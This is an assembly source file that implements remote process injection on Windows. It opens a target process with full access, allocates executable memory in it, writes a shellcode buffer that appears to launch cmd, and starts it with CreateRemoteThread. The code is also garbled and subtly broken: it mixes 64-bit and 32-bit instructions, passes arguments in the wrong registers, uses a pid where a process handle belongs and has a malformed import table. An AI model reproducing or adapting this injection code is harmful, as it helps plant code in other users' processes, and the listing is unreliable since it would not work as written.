section .data
    pid dd 0
    buffer db 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90 ;mycode
    db 0x48, 0x31, 0xC9
    db 0x48, 0x83, 0xE4, 0xF0
    db 0x50
    db 0x48, 0x89, 0xE2
    db 0x68, 0x2F, 0x63, 0x6D, 0x64
    db 0x68, 0x2F, 0x77, 0x69, 0x6E
    db 0x89, 0xE3
    db 0x50
    db 0x53
    db 0x51
    db 0x52
    db 0x54
    db 0xB8, 0xC7, 0x93, 0x1F, 0x00
    db 0xFF, 0xD0
    db 0xC3

section .text
    global _start

_start:
    mov eax, 0x001F0FFF
    mov ebx, [pid]
    mov ecx, 0x00000000
    call OpenProcess
    mov ebx, eax

    mov eax, 0x00000000
    mov ecx, 0x1000
    mov edx, 0x00001000
    mov esi, 0x00000040
    call VirtualAllocEx
    mov [buffer], eax

    mov eax, [pid]
    mov ecx, [buffer]
    mov edx, [buffer]
    mov esi, 0x100
    call WriteProcessMemory

    mov eax, [pid]
    mov ecx, [buffer]
    xor edx, edx
    xor esi, esi
    call CreateRemoteThread

    xor ebx, ebx
    call ExitProcess

section .idata
    dd 0, 0, 0, 0, 0
    db 'kernel32.dll', 0
    db 'OpenProcess,' 0
    db 'VirtualAllocEx', 0
    db 'WriteProcessMemory', 0
    db 'CreateRemoteThread', 0
    db 'ExitProcess', 0
